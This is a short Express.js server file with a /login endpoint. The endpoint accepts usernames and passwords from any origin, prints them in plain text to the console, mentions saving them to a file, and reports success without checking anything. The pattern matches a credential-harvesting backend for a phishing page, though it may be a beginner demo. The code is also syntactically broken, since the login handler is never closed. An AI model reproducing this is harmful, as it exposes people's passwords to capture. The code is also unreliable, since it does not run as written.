const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors"); // Import CORS package
const fs = require("fs"); // To write to a file (optional for saving credentials)

const app = express();
const port = 3000;

// Use CORS middleware to allow cross-origin requests
app.use(cors()); // This allows all origins, you can customize it if needed

// Middleware to parse JSON requests
app.use(bodyParser.json());

// Handle POST request from the login form
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  // Log the received username and password in the terminal
  console.log("Received login credentials:");
  console.log("Username:", username);
  console.log("Password:", password);

  // Optional: Save the credentials to a file
  res.json({ success: true, message: "Login successful" });

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
